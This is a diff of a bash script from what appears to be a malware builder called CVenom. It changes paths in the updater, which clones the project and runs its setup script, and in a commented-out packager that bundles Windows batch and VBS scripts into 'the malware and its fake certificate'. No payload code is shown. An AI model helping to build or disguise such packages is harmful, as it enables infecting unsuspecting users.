@@ -82,22 +82,22 @@ On_IWhite="\033[0;107m"   # White
 
 
 function updater(){
-	rm ~/.CVenom -rif &> /dev/null
+	rm $WINHOME/.CVenom -rif &> /dev/null
 	cd /tmp
 	rm /tmp/CVenom -rif
 	git clone https://github.com/Mahmoud7Osman/CVenom
-	cd CVenom/Setup
+	cd CVenom/Setup/Windows/
 	bash setup.sh
 }
 function uninstaller(){
-	rm ~/.CVenom -rif &> /dev/null
+	rm $WINHOME/.CVenom -rif &> /dev/null
 }
 
 #function FCD_Packager(){
 #	mkdir AppData
-#	cp ~/.CVenom/CTScripts/Windows/"$1"/* ./AppData/
-#	cp ~/.CVenom/CTScripts/Windows/settings.bat ./AppData
-#	cp ~/.CVenom/CTScripts/Windows/configurations.vbs ./AppData
+#	cp $WINHOME/.CVenom/CTScripts/Windows/"$1"/* ./AppData/
+#	cp $WINHOME/.CVenom/CTScripts/Windows/settings.bat ./AppData
+#	cp $WINHOME/.CVenom/CTScripts/Windows/configurations.vbs ./AppData
 #	printf "${BIGreen}Create A Single File Containing The Malware And It's Fake Certificate (ZIP File) [Y/n] "
 #	read cce
 #	if [ "$cce" == "y" ];then
